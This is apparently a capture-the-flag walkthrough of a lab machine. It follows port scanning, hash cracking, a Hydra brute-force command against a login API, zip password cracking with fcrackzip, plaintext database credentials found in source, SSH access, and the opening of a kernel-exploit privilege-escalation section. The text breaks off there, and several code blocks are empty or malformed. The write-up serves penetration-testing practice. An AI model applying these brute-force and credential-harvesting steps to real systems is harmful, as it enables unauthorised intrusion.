## Enumeration

First do the standard portscanning of every tcp port on the system.

```
$ nmap -Pn -A -T4 -p- 10.129.173.248                                                                                          1 тип
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.

Browsing through the api it seems the user infomation is left open 

```

```

Throwing the admin hash to a rainbow table (https://crackstation.net/) shows it is a sha256 and the password is manchester.

Could also do

```
cat myfiles.backup | base64 -d > backup
```

I tried to bruteforce the password with Hydra to get to know the syntax, but this just hangs after the last password it processes

```
$ hydra -v -V -l "myP14ceAdm1nAcc0uNT" -P "pwdfile" -s 3000 10.129.173.248 http-form-post "/api/session/authenticate:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:F=failed:C=Cookie"

```

The backup file is base64 encoded and running it through https://www.64baser.com/decode/upload/ reveals it is a zip file. Unfortunately the zip is password protected. This is quickly bruteforced with fcrackzip though.

```
$ fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt myplace 

PASSWORD FOUND!!!!: pw == magicword
```

I looking through the files we can find mark's password from one of the constants

```
$ grep mark *                                                                                                 
app.js:const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
```

## Initial Access

Using mark's password we found we can login using ssh

```
$ ssh mark@10.129.173.248 
mark@10.129.173.248's password:

The user flag is in tom's home directory but we don't have permissions to read it

## Privilege Escalation

### Method 1: kernel exploit cve-2017-16995

Linux exploit suggester shows several kernel vulnerabilities, which all do not work. This however does
